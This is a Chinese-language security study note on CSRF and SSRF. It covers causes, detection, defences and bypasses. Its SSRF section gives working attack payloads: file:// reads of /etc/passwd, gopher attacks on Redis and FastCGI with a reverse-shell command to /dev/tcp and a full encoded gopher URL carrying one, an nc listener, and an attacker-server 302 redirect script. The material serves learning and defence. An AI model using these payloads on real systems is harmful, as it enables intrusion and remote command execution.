---
title: 请求伪造漏洞
date: 2020-1-22 20:06:00
---
## CSRF

CSRF是跨站请求伪造攻击，由客户端发起，是由于没有在执行关键操作时，进行`是否由用户自愿发起的`确认攻击者通过用户的浏览器来注入额外的网络请求，来破坏一个网站会话的完整性。 

比如某网站**用户信息修改**功能，没有验证Referer也没添加Token，攻击者可以用HTML构造恶意代码提交POST请求，诱骗已经登陆的受害者点击，可以直接修改用户信息  

**修复建议**

> - 验证Referer
> - 添加token

**token和referer做横向对比，谁安全等级高？**

token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。token的话，要遵守不可预测性原则，保证其随机性（ 通过当前时间戳生成随机数 ）



**对referer的验证，从什么角度去做？如果做，怎么杜绝问题**

对header中的referer的验证，一个是空referer，一个是referer过滤或者检测不完善。
为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。

**针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？**	

针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等;

二是结合信息泄露漏洞对它的获取，结合着发起组合攻击;

信息泄露有可能是缓存、日志、get，也有可能是利用跨站;

很多跳转登录的都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了;

## SSRF

SSRF(Server-Side Request Forgery:服务器端请求伪造)  是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。

攻击的目标是从外网无法访问的内部系统	( 正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统 )

**SSRF 成因**是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制 (没有做合法性验证)。

### 出现场景

能够对外发起网络请求的地方，就可能存在 SSRF 漏洞。

在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。

从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。

### 检测

SSRF漏洞的验证方法：

> 1）通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞
>
> 2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞 

### 常见防御和绕过

> **检查Host是否是内网IP** ；IP地址转换绕过，DNS解析绕过(xip.io)，利用URL解析器滥用 
>
> **限制可用协议和请求端口**(HTTP、HTTPS；80、443)；302跳转绕过
>
> **禁止跳转**；
>
> **URL长度限制**；短链接：[生成短链接的网站](https://tinyurl.com/)

#### 攻击利用方法

#### **内网端口扫描**

```bash
ssrf.php?url=127.0.0.1:3306		#探测是否存在MySQL服务
```

#### **file协议读取内网文件**

```bash
ssrf.php?url=file:///etc/passwd
```

#### **GOPHER打redis**

> **条件：**能未授权或者通过弱口令认证访问到Redis服务器

方式主要有：

> 1、绝对路径写webshell
>
> 2、写contrab计划任务反弹shell

用脚本直接生成payload后去打就行（[脚本在这](https://github.com/LS95/gopher-redis-auth)，RESP协议还是要了解的，不能光会用脚本）

```bash
curl -v "payload内容"
```

#### **GOPHER打FastCGI**

一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。 

首先根据[faci_exp](https://github.com/piaca/fcgi_exp)生成exp，随后改成支持gopher协议的URL 

```bash
./fcgi_exp system 目标IP 9000 /var/www/html/1.php "bash -i >& /dev/tcp/攻击者IP/2333 0>&1"
nc -lvv 2333 > 1.txt
xdd 1.txt
```

 构造 Gopher 协议的 URL： 

```cmd
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```

curl请求

```bash
curl -v "Gopher协议的URL"
```

本地监听2333端口，收到反弹shell 

```bash
nc -lvv 2333
```

[如何通俗地解释 CGI、FastCGI、php-fpm 之间的关系？](https://www.zhihu.com/question/30672017)

### 常见绕过方法

#### 一、检查IP是否为内网IP

很多开发者认为，只要检查一下请求url的host不为内网IP，即可防御SSRF。

通常使用正则过滤以下5个IP段：

```
192.168.0.0/16
10.0.0.0/8
172.16.0.0/12
127.0.0.0/8
0.0.0.0/8   #在Linux下，127.0.0.1与0.0.0.0都指向本地
```

这种防御方法通常可以用IP地址进制转换绕过

> 利用八进制IP地址绕过 0177.0.0.1
>
> 利用十六进制IP地址绕过 0x7f000001
>
> 利用十进制的IP地址绕过 2130706433

他们一个都匹配不上正则表达式， 但实际请求都是127.0.0.1 

#### 二、DNS解析绕过

Host可能是IP形式，也可能是域名形式。

如果Host是域名形式，我们是没法直接比对的，只要其解析到内网IP上，就可以绕过。

网上有个神奇域名 [http://xip.io](http://xip.io/) (有墙)，[www.127.0.0.1.xip.io](https://www.cnblogs.com/wintrysec/p/www.127.0.0.1.xip.io),会自动解析到127.0.0.1



#### 三、利用URL解析器滥用

> 某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。
>
> 这时候可能会出现对URL参数解析不当，导致可以绕过过滤
>
> [http://www.baidu.com@127.0.0.1](http://www.baidu.com@127.0.0.1/)
>
> 当后端程序通过不正确的正则表达式,对上述URL的内容解析的时候
>
> 会认为访问URL的host为[www.baidu.com](https://www.cnblogs.com/wintrysec/p/www.baidu.com),而实际上请求的是127.0.0.1上的内容

![](/img/image-20200120223636988.png)



构造CURL的payload：

```bash
curl -d "url=http://foo@127.0.0.1:80@www.baidu.com/flag.php" "http://192.168.43.157"
```

#### 四、301/302跳转绕过

**条件**

> 1.程序的合法性检验逻辑为:检查url参数的host是否为内网地址
>
> 2.使用的是CURL方法，并且CURLOPT_FOLLOWLOCATION为true(即跟随302/301进行跳转)

**可利用的协议：**

> http/https ok
>
> dict ok
>
> gopher ok
>
> file no! [原因](https://curl.haxx.se/libcurl/c/CURLOPT_FOLLOWLOCATION.html)

**服务端代码：**

```php
//ssrf.php
<?php                                                                                                                                                
function curl($url){                                                         
    $ch = curl_init();                                                       
    curl_setopt($ch, CURLOPT_URL, $url);                                     
    curl_setopt($ch, CURLOPT_HEADER, 0);                                     
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);//根据服务器返回 HTTP 头中的 "Location: " 重定向 
    curl_exec($ch);                                                     
    curl_close($ch);                                                         
}                                                                            
$url = $_GET['url'];                                                         
print $url;                                                                  
curl($url);
```

**攻击者的vps：**

```php
//302.php
<?php  
$schema = $_GET['schema'];
$ip     = $_GET['ip'];
$port   = $_GET['port'];
$query  = $_GET['query'];

echo "\n";
echo $schema . "://".$ip."/".$query;

if(empty($port)){  
    header("Location: $schema://$ip/$query");
} else {
    header("Location: $schema://$ip:$port/$query");
}
```

**利用：**

```python
#http/https
http://目标网站HOST/ssrf.php?url=http://vps的IP/302.php?schema=http&ip=127.0.0.1&port=80
#file
http://目标网站HOST/ssrf.php?url=http://vps的IP/302.php?schema=file&ip=127.0.0.1&query=/etc/passwd
#dict
http://目标网站HOST/ssrf.php?url=http://vps的IP/302.php?schema=dict&ip=127.0.0.1&port=29362&query=info
#gopher
http://目标网站HOST/ssrf.php?url=http://vps的IP/302.php?schema=gopher&ip=127.0.0.1&port=2333&query=66666
```

### 总结

```php
file_get_contents()
fsockopen()
curl_exec()
```

以上三个函数使用不当会造成SSRF漏洞



curl7.43上gopher协议存在%00截断的BUG，v7.49可用

file_get_contents()的SSRF，gopher协议不能使用URLencode

file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败

### 更多参考

[SSRF在有无回显方面的利用及其思考与总结](https://xz.aliyun.com/t/6373) 

[【长亭科技】利用 Gopher 协议拓展攻击面](https://blog.chaitin.cn/gopher-attack-surfaces/)